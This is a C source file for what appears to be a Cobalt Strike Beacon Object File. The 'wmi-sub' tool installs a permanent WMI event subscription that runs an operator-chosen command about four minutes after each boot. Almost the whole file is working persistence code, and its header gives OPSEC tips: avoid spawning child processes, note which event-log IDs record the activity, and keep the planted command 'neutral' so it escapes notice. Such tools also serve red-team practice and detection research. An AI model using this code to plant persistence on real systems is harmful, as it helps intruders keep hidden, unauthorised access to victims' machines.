/*
 * wmi_sub.c — create a permanent WMI event subscription in root\subscription
 * (system boot trigger). One command, one purpose.
 *
 * Creates, in this order:
 *   __EventFilter               Name=<sub>, WQL boot trigger
 *   __CommandLineEventConsumer  Name=<sub>, CommandLineTemplate=<cmd>
 *   __FilterToConsumerBinding   Filter=<filter>, Consumer=<consumer>
 *
 * args: str subName, str commandLine
 *
 * OPSEC:
 *   - In-process COM (CoCreateInstance on the WMI locator) — no child process,
 *     no schtasks.exe.
 *   - Expected telemetry: WMI-Activity Operational 5857-5861 on creation;
 *     consumer execution events appear at each trigger (boot) — the command is
 *     visible in 5861. Keep the consumer command short and neutral.
 *   - Removal is a separate command (wmi-clear, same subName) — always plan the
 *     clear before the create; run persist-inventory afterwards to verify.
 *
 * Build: see ../Makefile. WMI COM via wbemcli.h (CINTERFACE + COBJMACROS).
 */
#define CINTERFACE 1
#define COBJMACROS 1
#include <windows.h>
#include <objbase.h>
#include <wbemcli.h>
#include <string.h>
#include "beacon.h"

DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeEx(LPVOID, DWORD);
DECLSPEC_IMPORT void    WINAPI OLE32$CoUninitialize(void);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstance(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoSetProxyBlanket(IUnknown*, DWORD, DWORD, OLECHAR*, DWORD, DWORD, void*, DWORD);
DECLSPEC_IMPORT BSTR    WINAPI OLEAUT32$SysAllocString(const OLECHAR*);
DECLSPEC_IMPORT void    WINAPI OLEAUT32$SysFreeString(BSTR);
DECLSPEC_IMPORT void    WINAPI OLEAUT32$VariantClear(VARIANTARG*);
DECLSPEC_IMPORT void    WINAPI OLEAUT32$VariantInit(VARIANTARG*);
DECLSPEC_IMPORT int     __cdecl MSVCRT$swprintf(wchar_t*, size_t, const wchar_t*, ...);
DECLSPEC_IMPORT int     __cdecl MSVCRT$sprintf(char*, const char*, ...);
DECLSPEC_IMPORT int     WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, const char*, int, wchar_t*, int);

static const GUID kLocCls  = { 0x4590f811, 0x1d3a, 0x11d0, { 0x89,0x1f, 0x00,0xaa, 0x00,0x4b, 0x2e,0x24 } };
static const GUID kLocIid  = { 0xdc12a687, 0x737f, 0x11cf, { 0x88,0x4d, 0x00,0xaa, 0x00,0x4b, 0x2e,0x24 } };
static const GUID kSvcIid  = { 0xb81142ae, 0x5da6, 0x11d2, { 0xbb,0xd0, 0x00,0x10, 0x4b,0xcc, 0x4b,0x4c } };

static void PutBstrVal(IWbemClassObject* obj, LPWSTR prop, wchar_t* val)
{
    VARIANT v;
    VariantInit(&v);
    v.vt = VT_BSTR;
    v.bstrVal = OLEAUT32$SysAllocString(val);
    IWbemClassObject_Put(obj, prop, 0, &v, 0);
    OLEAUT32$VariantClear(&v);
}

typedef struct _SUB_CTX {
    wchar_t* name;
    wchar_t* query;
    wchar_t* cmdline;
} SUB_CTX;

static BOOL PutInstance(IWbemServices* svc, wchar_t* className,
                        void (*fill)(IWbemClassObject*, void*), void* ctx)
{
    IWbemClassObject* pClass  = NULL;
    IWbemClassObject* pInst   = NULL;
    IWbemCallResult*  pResult = NULL;
    HRESULT hr;
    BOOL ok = FALSE;

    hr = IWbemServices_GetObject(svc, className, WBEM_FLAG_RETURN_WBEM_COMPLETE, NULL, &pClass, &pResult);
    if (pResult) pResult->lpVtbl->Release(pResult);
    if (FAILED(hr) || !pClass) {
        BeaconPrintf(CALLBACK_ERROR, "[-] GetObject(%ws) failed hr=0x%08lx\n", className, (unsigned long)hr);
        return FALSE;
    }

    hr = IWbemClassObject_SpawnInstance(pClass, 0, &pInst);
    pClass->lpVtbl->Release(pClass);
    if (FAILED(hr) || !pInst) {
        BeaconPrintf(CALLBACK_ERROR, "[-] SpawnInstance(%ws) failed hr=0x%08lx\n", className, (unsigned long)hr);
        return FALSE;
    }

    fill(pInst, ctx);

    hr = IWbemServices_PutInstance(svc, pInst, WBEM_FLAG_CREATE_ONLY, NULL, &pResult);
    if (pResult) pResult->lpVtbl->Release(pResult);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] PutInstance(%ws) failed hr=0x%08lx\n", className, (unsigned long)hr);
    } else {
        ok = TRUE;
    }
    pInst->lpVtbl->Release(pInst);
    return ok;
}

static void FillFilter(IWbemClassObject* obj, void* raw)
{
    SUB_CTX* c = (SUB_CTX*)raw;
    PutBstrVal(obj, L"Name", c->name);
    PutBstrVal(obj, L"EventNamespace", L"root\\subscription");
    PutBstrVal(obj, L"QueryLanguage", L"WQL");
    PutBstrVal(obj, L"Query", c->query);
}

static void FillConsumer(IWbemClassObject* obj, void* raw)
{
    SUB_CTX* c = (SUB_CTX*)raw;
    VARIANT v;
    VariantInit(&v);
    v.vt = VT_BOOL;
    v.boolVal = VARIANT_FALSE;
    IWbemClassObject_Put(obj, L"MaybeShowWindow", 0, &v, 0);
    v.boolVal = VARIANT_TRUE;
    IWbemClassObject_Put(obj, L"RunEventInSession", 0, &v, 0);
    VariantClear(&v);
    PutBstrVal(obj, L"Name", c->name);
    PutBstrVal(obj, L"CommandLineTemplate", c->cmdline);
}

static void FillBinding(IWbemClassObject* obj, void* raw)
{
    SUB_CTX* c = (SUB_CTX*)raw;
    wchar_t fBuf[128], cBuf[128];
    MSVCRT$swprintf(fBuf, 128, L"__EventFilter.Name=\"%ws\"", c->name);
    MSVCRT$swprintf(cBuf, 128, L"__CommandLineEventConsumer.Name=\"%ws\"", c->name);
    PutBstrVal(obj, L"Filter", fBuf);
    PutBstrVal(obj, L"Consumer", cBuf);
}

void go(char* args, int alen)
{
    datap p;
    BeaconDataParse(&p, args, alen);
    char* nameA = BeaconDataExtract(&p, NULL);
    char* cmdA  = BeaconDataExtract(&p, NULL);
    if (!nameA || !*nameA || !cmdA || !*cmdA) {
        BeaconPrintf(CALLBACK_ERROR, "usage: wmi-sub <subName> <command>\n");
        return;
    }

    wchar_t nameW[128], cmdW[512];
    if (!KERNEL32$MultiByteToWideChar(CP_UTF8, 0, nameA, -1, nameW, 128)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] name wide conversion failed\n");
        return;
    }
    if (!KERNEL32$MultiByteToWideChar(CP_UTF8, 0, cmdA, -1, cmdW, 512)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] command wide conversion failed\n");
        return;
    }

    /* Boot trigger: fires ~4 minutes after boot; WITHIN 60 = classic form,
     * SystemUpTime guard suppresses the initial event storm. */
    wchar_t query[] = L"SELECT * FROM __InstanceModificationEvent WITHIN 60 "
                      L"WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' "
                      L"AND TargetInstance.SystemUpTime >= 240";

    HRESULT hr;
    IWbemLocator*  pLoc  = NULL;
    IWbemServices* pSvc  = NULL;
    BOOL created = 0;

    hr = OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CoInitializeEx failed hr=0x%08lx\n", (unsigned long)hr);
        return;
    }

    hr = OLE32$CoCreateInstance(&kLocCls, NULL, CLSCTX_INPROC_SERVER, &kLocIid, (void**)&pLoc);
    if (FAILED(hr) || !pLoc) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CoCreateInstance(WbemLocator) hr=0x%08lx\n", (unsigned long)hr);
        goto out;
    }

    hr = IWbemLocator_ConnectServer(pLoc, L"ROOT\\subscription", NULL, NULL, NULL, 0, NULL, NULL, &pSvc);
    if (FAILED(hr) || !pSvc) {
        BeaconPrintf(CALLBACK_ERROR, "[-] ConnectServer(root\\subscription) hr=0x%08lx\n", (unsigned long)hr);
        goto out;
    }

    hr = OLE32$CoSetProxyBlanket((IUnknown*)pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
                                 RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CoSetProxyBlanket hr=0x%08lx\n", (unsigned long)hr);
        goto out;
    }

    {
        SUB_CTX ctx;
        ctx.name    = nameW;
        ctx.query   = query;
        ctx.cmdline = cmdW;

        if (!PutInstance(pSvc, L"__EventFilter", FillFilter, &ctx))                     goto out;
        created |= 1;
        if (!PutInstance(pSvc, L"__CommandLineEventConsumer", FillConsumer, &ctx))      goto out;
        created |= 2;
        if (!PutInstance(pSvc, L"__FilterToConsumerBinding", FillBinding, &ctx))        goto out;
        created |= 4;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] wmi-sub created: name=%s (bits 0x%x) fires ~4 min after boot\n"
                                  "[i] remove with: wmi-clear %s\n",
                 nameA, created, nameA);

out:
    if (created == 7)
        { /* all three placed */ }
    else if (created)
        BeaconPrintf(CALLBACK_OUTPUT, "[!] partial install (installed bits 0x%x) — clear with: wmi-clear %s\n", created, nameA);
    if (pSvc)  pSvc->lpVtbl->Release(pSvc);
    if (pLoc)  pLoc->lpVtbl->Release(pLoc);
    OLE32$CoUninitialize();
}